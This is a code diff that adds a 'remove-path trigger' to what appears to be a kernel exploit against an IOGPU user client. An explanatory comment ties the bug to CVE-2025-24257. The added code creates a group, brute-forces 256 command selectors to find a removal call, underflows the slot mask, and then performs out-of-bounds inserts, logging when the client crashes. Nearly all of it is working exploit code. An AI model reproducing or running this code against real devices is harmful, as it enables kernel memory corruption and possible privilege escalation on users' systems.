@@ -387,6 +387,87 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] cmd=64 trigger done");
     }
 
+
+    if (trigger == 3) {
+        /* THE REMOVE PATH.
+         *
+         * The mask lives at +0x30 of the slot table and is DECREMENTED on
+         * every removal:
+         *   0x9f51914: ldr  w9, [x0, #48]     ; +0x30 = MASK
+         *   0x9f51918: sub  w9, w9, #1
+         *   0x9f5191c: str  w9, [x0, #48]
+         * A group created with capacity 64 has MASK = (64>>6)-1 = 0, so the
+         * first removal turns it into 0xffffffff. After that the bitmap word
+         * index is no longer masked and the insert path
+         * (0x9f62c04 lsr x9,x20,x9 / 0x9f62c28 ldr w10,[x12]) walks out of
+         * the allocation. That is the live CVE-2025-24257 on 23.55.
+         *
+         * So: create the group, add a resource, find the command that
+         * REMOVES it, then add again - the second add is the one that
+         * goes out of bounds.
+         */
+        ol("[grp] === REMOVE-PATH TRIGGER ===");
+        static uint8_t o3[0x200];
+        size_t on3 = 0;
+
+        int k3 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o3, &on3);
+        uint64_t grp3 = 0;
+        if (k3 == 0) memcpy(&grp3, o3 + 0x10, 8);
+        ol("[grp] group -> kr=0x%x grp=0x%016llx", k3, (unsigned long long)grp3);
+        if (k3 != 0) { ol("[grp] no group"); return; }
+
+        int ka = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o3, &on3);
+        ol("[grp] add surf_id=%u -> kr=0x%x", surf_id, ka);
+
+        /* Which command removes it? Try every command with the surface id
+         * in struct[56] and with the group handle, and note the ones that
+         * answer. */
+        ol("[grp] probing the remove command");
+        uint32_t rem_cmd = 0xffffffffu;
+        for (uint32_t cmd = 0; cmd < 256; cmd++) {
+            if (cmd == CMD_NEW_GROUP || cmd == CMD_ADD_RES) continue;
+            uint64_t key = surf_id;
+            int kk = call_sel(conn, cmd, key, 1, 0, 0, o3, &on3);
+            if (kk == 0) {
+                ol("[grp] cmd=%u with the surface id -> kr=0 (candidate remove)", cmd);
+                if (rem_cmd == 0xffffffffu) rem_cmd = cmd;
+            }
+        }
+        ol("[grp] remove candidate cmd=%u", rem_cmd);
+
+        if (rem_cmd != 0xffffffffu) {
+            ol("[grp] *** removing the resource with cmd=%u - the mask goes 0 -> 0xffffffff", rem_cmd);
+            int kr2 = call_sel(conn, rem_cmd, surf_id, 1, 0, 0, o3, &on3);
+            ol("[grp] remove -> kr=0x%x", kr2);
+            ol("[grp] adding again: this insert must use the underflowed mask");
+            for (uint32_t extra = 0; extra < 8 && extra < nsurf; extra++) {
+                ol("[grp] OOB add surf_id=%u", surf_ids[extra]);
+                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[extra], 1, 0, 0, o3, &on3);
+                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[extra], ke);
+                if (ke == (int)0x10000003) {
+                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
+                       "bitmap access already hit unmapped memory");
+                    break;
+                }
+            }
+        } else {
+            ol("[grp] no remove command found by probing; trying the group handle as the key");
+            for (uint32_t cmd = 0; cmd < 256; cmd++) {
+                if (cmd == CMD_NEW_GROUP || cmd == CMD_ADD_RES) continue;
+                int kk = call_sel(conn, cmd, grp3, 1, 0, 0, o3, &on3);
+                if (kk == 0) {
+                    ol("[grp] cmd=%u with the group handle -> kr=0 (candidate remove)", cmd);
+                    int kr2 = call_sel(conn, cmd, grp3, 1, 0, 0, o3, &on3);
+                    ol("[grp]   repeat -> kr=0x%x", kr2);
+                    int ke = call_sel(conn, CMD_ADD_RES, surf_id, 1, 0, 0, o3, &on3);
+                    ol("[grp]   add after that -> kr=0x%x", ke);
+                    break;
+                }
+            }
+        }
+        ol("[grp] remove-path trigger done");
+    }
+
     if (trigger == 1) {
         /* DIRECT GROW on a FRESH connection.
            0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
